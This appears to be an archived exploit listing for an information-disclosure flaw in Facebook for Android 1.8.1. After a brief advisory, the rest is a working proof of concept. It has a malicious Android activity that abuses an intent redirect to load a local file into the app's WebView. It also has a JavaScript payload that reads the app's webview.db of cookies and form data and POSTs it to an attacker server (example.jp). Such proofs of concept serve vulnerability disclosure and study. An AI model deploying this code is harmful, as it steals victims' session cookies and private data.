source: https://www.securityfocus.com/bid/57173/info

Facebook for Android is prone to an information-disclosure vulnerability.

Successful exploits allows an attacker to gain access to sensitive information. Information obtained may aid in further attacks.

Facebook for Android 1.8.1 is vulnerable; other versions may also be affected.

++++++ Attacker's app (activity) ++++++
  
  // notice: for a successful attack, the victim user must be logged-in
  // to Facebook in advance.
  public class AttackFacebook extends Activity {

      // package name of Facebook app
      static final String FB_PKG = "com.facebook.katana";
  
      // LoginActivity of Facebook app
      static final String FB_LOGIN_ACTIVITY
           = FB_PKG + ".LoginActivity";
  
      // FacebookWebViewActivity of Facebook app
      static final String FB_WEBVIEW_ACTIVITY
           = FB_PKG + ".view.FacebookWebViewActivity";
  
      @Override
      public void onCreate(Bundle bundle) {
          super.onCreate(bundle);
          attack();
      }
  
      // main method
      public void attack() {
          // create continuation_intent to call FacebookWebViewActivity.
          Intent contIntent = new Intent();
          contIntent.setClassName(FB_PKG, FB_WEBVIEW_ACTIVITY);
          // URL pointing to malicious local file.
          // FacebookWebViewActivity will load this URL into its WebView.
          contIntent.putExtra("url", "file:///sdcard/attack.html");
  
          // create intent to be sent to LoginActivity.
          Intent intent = new Intent();
          intent.setClassName(FB_PKG, FB_LOGIN_ACTIVITY);
          intent.putExtra("login_redirect", false);
  
          // put continuation_intent into extra data of the intent.
          intent.putExtra(FB_PKG + ".continuation_intent", contIntent);
  
          // call LoginActivity
          this.startActivity(intent);
      }
  }

  ++++++ Attacker's HTML/JavaScript file ++++++
  
  <!--
  attacker's app should put this file to /sdcard/attack.html in advance
  -->
 <html>
  <body onload="doAttack()">
  <h1>attack.html</h1>
  <script>
  // file path to steal. webview.db can be a good target for attackers
  // because it contains cookies, formdata etc.
  var target = "file:///data/data/com.facebook.katana/databases/webview.db";
  
  // get the contents of the target file by XHR
  function doAttack() {
      var xhr1 = new XMLHttpRequest();
      xhr1.overrideMimeType("text/plain; charset=iso-8859-1");
      xhr1.open("GET", target);
      xhr1.onreadystatechange = function() {
          if (xhr1.readyState == 4) {
              var content = xhr1.responseText;
              // send the content of the file to attacker's server
              sendFileToAttackerServer(content);
              // for debug
              document.body.appendChild(document.createTextNode(content));
          }
      };
      xhr1.send();
  }
  
  // Send the content of target file to the attacker's server
  function sendFileToAttackerServer(content) {
      var xhr2 = new XMLHttpRequest();
      xhr2.open("POST", "http://www.example.jp/";);
      xhr2.send(encodeURIComponent(content));
  }
  </script>
  </body>
  </html>